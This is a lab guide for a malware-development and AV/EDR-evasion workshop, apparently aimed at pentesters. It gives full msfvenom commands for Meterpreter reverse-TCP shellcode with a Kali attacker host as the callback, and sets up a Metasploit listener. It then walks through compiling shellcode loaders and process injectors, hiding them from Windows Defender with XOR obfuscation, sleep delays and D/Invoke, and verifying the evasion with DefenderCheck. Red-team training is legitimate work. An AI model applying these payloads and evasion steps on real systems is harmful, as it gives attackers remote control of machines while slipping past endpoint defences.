# MalDev & AV-EDR Evasion for Pentesters Lab Guide

## Lab 0 - Environment Setup

For this workshop you will need the following hosts:

- Development / Target Host: A Windows 10 VM with the following software installed:
	
	- You can download Windows 10 from: https://tb.rg-adguard.net/public.php
	- Visual Studio Code: https://code.visualstudio.com/
		a) Associate the .cs file extension to Visual Studio Code
	- API Monitor: http://www.rohitab.com/apimonitor
	- CFF Explorer from Explorer Suite: https://ntcore.com/?page_id=388
	- Google Chrome: https://www.google.com/intl/es-419/chrome/
	- Git: https://gitforwindows.org/
	- Windows Terminal: https://github.com/microsoft/terminal
	- Python: https://www.python.org/downloads/
		a) py -3 -m pip install colorama
		b) py -3 -m pip install termcolor
	- Roslyn compiler: https://www.dropbox.com/s/rz1e843j18yzmjh/Roslyn.zip?dl=0 and unzip folder in %USERPROFILE%\Documents
		a) Add the following path as PATH environment variable: %USERPROFILE%\Documents\Roslyn
	- DefenderCheck: https://www.dropbox.com/s/xkyef3xww6oxx08/DefenderCheck.zip?dl=0 and unzip folder in %USERPROFILE%\Documents
		a) Add the following path as PATH environment variable: %USERPROFILE%\Documents\DefenderCheck
		b) Add the %USERPROFILE%\Documents\DefenderCheck path to Windows Defender as an exclusion
	- Metasploit Framework (Windows): https://windows.metasploit.com/metasploitframework-latest.msi
		a) Add the following path as PATH environment variable: C:\metasploit-framework\bin
		b) Add the C:\metasploit-framework path to Windows Defender as an exclusion
	- Windows Defender with an exclusion added to the folder where we will be developing our projects ("%USERPROFILE%\Desktop\Testing" folder in this case).

- Attacker Host: A Kali VM

	- You can download Kali VM from: https://www.kali.org/get-kali/#kali-virtual-machines

In case you already have these things set up, feel free to skip over this lab.

---

**Credentials for the provided VMs**

*Windows 10 Development / Target Host*

User: cha0x
Password: Password123

*Kali VM Attacker Host*

User: kali
Password: kali

## Lab 1 - C# Basics

- **Exercise 1: HelloWorld**

	- Go to "Testing/Lab 1 - C# Basics" folder in Desktop.
	- Right-click with the mouse, and "Open in Terminal Preview"
	- `csc.exe .\1-HelloWorld.cs`
	- Execute 1-HelloWorld.exe

- **Exercise 2: MessageBox**

	- Go to "Testing/Lab 1 - C# Basics" folder in Desktop.
	- Right-click with the mouse, and "Open in Terminal Preview"
	- `csc.exe .\2-MessageBox.cs`
	- Execute 2-MessageBox.exe

## Lab 2 - Shellcoding

- **Exercise 1: Generate shellcode with msfvenom**

	- In the Kali VM, open a new terminal:
	```
	[create new folder called "testing" and move to that folder]
	mkdir testing
	cd testing
	
	[identify eth0 network interface ip address]
	ifconfig
	ip addr

	[generate raw meterpreter staged shellcode]
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[eth0 IP ADDRESS] LPORT=[PORT] EXITFUNC=thread -f raw -o met.bin
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.133 LPORT=443 EXITFUNC=thread -f raw -o met.bin
	
	[generate raw hex meterpreter staged shellcode]
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[eth0 IP ADDRESS] LPORT=[PORT] EXITFUNC=thread -f hex -o met.hex
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.133 LPORT=443 EXITFUNC=thread -f hex -o met.hex
	cat met.hex
	
	[generate csharp meterpreter staged shellcode]
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[eth0 IP ADDRESS] LPORT=[PORT] EXITFUNC=thread -f csharp -o met.cs
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.133 LPORT=443 EXITFUNC=thread -f csharp -o met.cs
	cat met.cs
	
	[generate exe meterpreter staged shellcode]
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[eth0 IP ADDRESS] LPORT=[PORT] EXITFUNC=thread -f exe -o met.exe
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.133 LPORT=443 EXITFUNC=thread -f exe -o met.exe

	[in the same folder, start an HTTP server to file sharing]
	python3 -m http.server
	```

	- In a different console tab or window, in the Kali VM:

	```
	sudo msfconsole
	use exploit/multi/handler
	set payload windows/x64/meterpreter/reverse_tcp
	[set LHOST [eth0 IP ADDRESS]]
	set LHOST 192.168.100.133
	[set LPORT [PORT]]
	set LPORT 443
	set exitonsession false
	set enablestageencoding true
	set exitfunc thread
	run -j
	```

	- In the Windows 10 Development Host:

	- Verify Defender is disabled
	- Open Chrome, access to http://192.168.100.133:8000
	- Dowload met.exe, click on "Keep dangerous file", click on "Keep anyway", click "Run..."
	- Execute met.exe file
	- On Terminal Preview: `DefenderCheck.exe .\met.exe`

- **Exercise 2: Basic shellcode loader**

	- Verify Defender is disabled
	- Go to "Testing/Lab 2 - Simple Shellcode Runner" folder in Desktop.
	- Double-click with the mouse on the 2-BasicShellcodeLoader.cs file
	- Replace "// CODE" line with the C# byte array generated with msfvenom as met.cs, save the changes, close
	- Right-click with the mouse in the "Testing/Lab 2 - Simple Shellcode Runner" folder, and "Open in Terminal Preview"
	- `csc.exe .\2-BasicShellcodeLoader.cs /unsafe`
	- Execute 2-BasicShellcodeLoader.exe
	- Verify meterpreter new incoming session on Kali VM

- **Exercise 3: Basic shellcode injector**

	- Verify Defender is disabled
	- Go to "Testing/Lab 2 - Simple Shellcode Runner" folder in Desktop.
	- Double-click with the mouse on the 3-BasicShellcodeInjector.cs file
	- Replace "// CODE" line with the C# byte array generated with msfvenom as met.cs, save the changes, close
	- Right-click with the mouse in the "Testing/Lab 2 - Simple Shellcode Runner" folder, and "Open in Terminal Preview"
	- `csc.exe .\3-BasicShellcodeInjector.cs /unsafe`
	- Execute 3-BasicShellcodeInjector.exe
	- Verify meterpreter new incoming session on Kali VM
	
## Lab 3 - AV-EDR Evasion

- Copy the met.hex file generated in the last exercise to the "Testing/Lab 3 - AV-EDR Evasion" folder

- **Exercise 1: AV evasion with strings and shellcode obfuscation**

	- Go to "Testing/Lab 3 - AV-EDR Evasion" folder in Desktop.
	- Right-click with the mouse, and "Open in Terminal Preview"
	- `py -3 .\xor-encoder.py -i .\met.hex -s .\strings.txt`
	- Double-click with the mouse on the 1-BasicShellcodeInjector.cs file
	- Replace "// CODE" below "// C# xorDecodeBytes routine" with the "C# xorDecodeBytes routine" generated with xor-encoder.py
	- Replace "// CODE" below "// C# xorDecodeString routine" with the "C# xorDecodeString routine" generated with xor-encoder.py
	- Replace "// CODE" below "// XOR Key" with the "XOR Key" generated with xor-encoder.py
	- Replace "// CODE" below "// XOR encoded shellcode C# Byte Array" with the "XOR encoded shellcode C# Byte Array" generated with xor-encoder.py
	- Replace "// CODE" below "// C# shellcode decoding" with the "C# shellcode decoding" generated with xor-encoder.py
	- Replace "// CODE" below "// XOR encoded string C# Byte Array" with the "XOR encoded string C# Byte Array" generated with xor-encoder.py
	- Replace "// CODE" below "// C# string decoding" with the "C# shellcode decoding" generated with xor-encoder.py for "notepad" string
	- Replace "string targetProc = "notepad";" line with the generated 'decoded' string "string targetProc = decoded_string_XXXXX;"
	- Save the changes, close
	- Open notepad
	- On Terminal Preview: `csc.exe .\1-BasicShellcodeInjector.cs /unsafe`
	- Verify Defender is enabled
	- On Terminal Preview: `DefenderCheck.exe .\1-BasicShellcodeInjector.exe`
	- Copy 1-BasicShellcodeInjector.exe to the Desktop
	
- **Exercise 2: AV evasion with obfuscation and sleep delay**

	- Go to "Testing/Lab 3 - AV-EDR Evasion" folder in Desktop.
	- Right-click with the mouse, and "Open in Terminal Preview"
	- `py -3 .\xor-encoder.py -i .\met.hex -s .\strings.txt`
	- Double-click with the mouse on the 2-BasicShellcodeInjectorwithSleep.cs file
	- Replace "// CODE" below "// C# xorDecodeBytes routine" with the "C# xorDecodeBytes routine" generated with xor-encoder.py
	- Replace "// CODE" below "// C# xorDecodeString routine" with the "C# xorDecodeString routine" generated with xor-encoder.py
	- Replace "// CODE" below "// XOR Key" with the "XOR Key" generated with xor-encoder.py
	- Replace "// CODE" below "// XOR encoded shellcode C# Byte Array" with the "XOR encoded shellcode C# Byte Array" generated with xor-encoder.py
	- Replace "// CODE" below "// C# shellcode decoding" with the "C# shellcode decoding" generated with xor-encoder.py
	- Replace "// CODE" below "// XOR encoded string C# Byte Array" with the "XOR encoded string C# Byte Array" generated with xor-encoder.py
	- Replace "// CODE" below "// C# string decoding" with the "C# shellcode decoding" generated with xor-encoder.py for "notepad" string
	- Replace "string targetProc = "notepad";" line with the generated 'decoded' string "string targetProc = decoded_string_XXXXX;"
	- Save the changes, close
	- Open notepad
	- On Terminal Preview: `csc.exe .\2-BasicShellcodeInjectorwithSleep.cs /unsafe`
	- Verify Defender is enabled
	- On Terminal Preview: `DefenderCheck.exe .\2-BasicShellcodeInjectorwithSleep.exe`
	- Copy 2-BasicShellcodeInjectorwithSleep.exe to the Desktop
	- Execute 2-BasicShellcodeInjectorwithSleep.exe
	- Verify meterpreter new incoming session on Kali VM

- **Exercise 3: Modifying behavior**
	
	- In the Kali VM, in the existing msfconsole:
	```
	jobs -K
	set autoloadstdapi false
	run -j
	```
	- Copy 2-BasicShellcodeInjectorwithSleep.exe to the Desktop
	- Execute 2-BasicShellcodeInjectorwithSleep.exe
	- Verify meterpreter new incoming session on Kali VM
	- In meterpreter, after a minute: `load stdapi`

- **Exercise 4: EDR evasion with D/Invoke**

	- Go to "Testing/Lab 3 - AV-EDR Evasion" folder in Desktop.
	- Right-click with the mouse, and "Open in Terminal Preview"
	- `py -3 .\xor-encoder.py -i .\met.hex -s .\strings.txt`
	- Double-click with the mouse on the 4-BasicShellcodeInjectorwithSleep(DInvoke).cs file
	- Replace "// CODE" below "// C# xorDecodeBytes routine" with the "C# xorDecodeBytes routine" generated with xor-encoder.py
	- Replace "// CODE" below "// C# xorDecodeString routine" with the "C# xorDecodeString routine" generated with xor-encoder.py
	- Replace "// CODE" below "// XOR Key" with the "XOR Key" generated with xor-encoder.py
	- Replace "// CODE" below "// XOR encoded shellcode C# Byte Array" with the "XOR encoded shellcode C# Byte Array" generated with xor-encoder.py
	- Replace "// CODE" below "// C# shellcode decoding" with the "C# shellcode decoding" generated with xor-encoder.py
	- Replace "// CODE" below "// XOR encoded string C# Byte Array" with the "XOR encoded string C# Byte Array" generated with xor-encoder.py
	- Replace "// CODE" below "// C# string decoding" with the "C# shellcode decoding" generated with xor-encoder.py for "notepad" string
	- Replace "string targetProc = "notepad";" line with the generated 'decoded' string "string targetProc = decoded_string_XXXXX;"
	- Save the changes, close
	- Open notepad
	- On Terminal Preview: `csc.exe .\4-BasicShellcodeInjectorwithSleep(DInvoke).cs /unsafe`
	- Verify Defender is enabled
	- On Terminal Preview: `DefenderCheck.exe .\4-BasicShellcodeInjectorwithSleep(DInvoke).exe`
	- Copy 4-BasicShellcodeInjectorwithSleep(DInvoke).exe to the Desktop
	- Execute 4-BasicShellcodeInjectorwithSleep(DInvoke).exe
	- Verify meterpreter new incoming session on Kali VM
	- In meterpreter, after a minute: `load stdapi`
	
	To compare the difference between P/Invoke and D/Invoke:
	
	- Open the files with API Monitor (Run as Administrator)
	- Open the files with CFF Explorer